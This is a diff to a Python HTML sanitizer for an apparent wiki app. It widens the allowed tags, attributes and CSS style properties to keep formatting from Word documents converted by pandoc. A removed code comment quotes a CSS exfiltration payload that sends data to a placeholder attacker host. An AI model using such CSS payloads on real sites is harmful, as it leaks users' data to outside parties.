@@ -32,7 +32,7 @@ import nh3
 ALLOWED_TAGS: frozenset[str] = frozenset(
     {
         # blocks
-        "p", "br", "hr", "blockquote", "pre", "div",
+        "p", "br", "hr", "blockquote", "pre", "div", "nav",
         "h1", "h2", "h3", "h4", "h5", "h6",
         # inline marks
         "strong", "b", "em", "i", "u", "s", "del", "code", "span", "sub", "sup", "mark",
@@ -57,17 +57,20 @@ ALLOWED_ATTRIBUTES: dict[str, set[str]] = {
     "img": {"src", "alt", "title", "width", "height", "data-caption", "data-alignment"},
     "pre": {"class"},
     "code": {"class"},
-    "span": {"class", "data-type"},
+    "span": {"class", "data-type", "data-wikihub-text-style", "style"},
     "div": {"class", "data-type", "data-callout-type", "data-open"},
+    "nav": {"data-type"},
     "ul": {"class", "data-type"},
     "ol": {"class", "start", "type"},
-    "li": {"class", "data-type", "data-checked"},
+    "li": {"class", "data-type", "data-checked", "style"},
     # `disabled` and `checked` only; a task-list checkbox is decoration, and
     # `name`/`value`/`formaction` have no business in page content.
     "input": {"type", "checked", "disabled", "class"},
-    "th": {"colspan", "rowspan", "style"},
-    "td": {"colspan", "rowspan", "style"},
-    "table": {"class"},
+    "th": {"colspan", "rowspan", "colwidth", "style"},
+    "td": {"colspan", "rowspan", "colwidth", "style"},
+    "thead": {"style"},
+    "tr": {"style"},
+    "table": {"class", "style"},
     "p": {"style", "class"},
     "h1": {"style"}, "h2": {"style"}, "h3": {"style"},
     "h4": {"style"}, "h5": {"style"}, "h6": {"style"},
@@ -82,10 +85,33 @@ ALLOWED_URL_SCHEMES: frozenset[str] = frozenset({"http", "https", "mailto"})
 #: `style` is allowed on exactly the tags above, and then only `text-align`
 #: survives - that is the one declaration WikiHub's own editor round-trips
 #: (Tiptap's TextAlign extension) and the one pandoc emits for table cells.
-#: Everything else in a `style` attribute is dropped, which closes off CSS-based
-#: exfiltration (`background: url(https://attacker/?c=...)`) without losing
-#: alignment from the source document.
-ALLOWED_STYLE_PROPERTIES: frozenset[str] = frozenset({"text-align"})
+#: Everything else in a `style` attribute is dropped. These properties cover
+#: the visual formatting pandoc carries out of Word (text/cell colours, type
+#: emphasis, font sizing and table borders) without allowing resource-loading
+#: properties such as `background` or `content`.
+ALLOWED_STYLE_PROPERTIES: frozenset[str] = frozenset(
+    {
+        "text-align",
+        "color",
+        "background-color",
+        "font-family",
+        "font-size",
+        "font-style",
+        "font-weight",
+        "text-decoration",
+        "vertical-align",
+        "border",
+        "border-collapse",
+        "border-color",
+        "border-style",
+        "border-width",
+        "display",
+        "padding",
+        "white-space",
+        "width",
+        "height",
+    }
+)
 
 #: A class token we are willing to keep. `.`, `/` and `:` are allowed because
 #: WikiHub's own task-list markup (`app/modules/pages/tiptap_html.py`) is
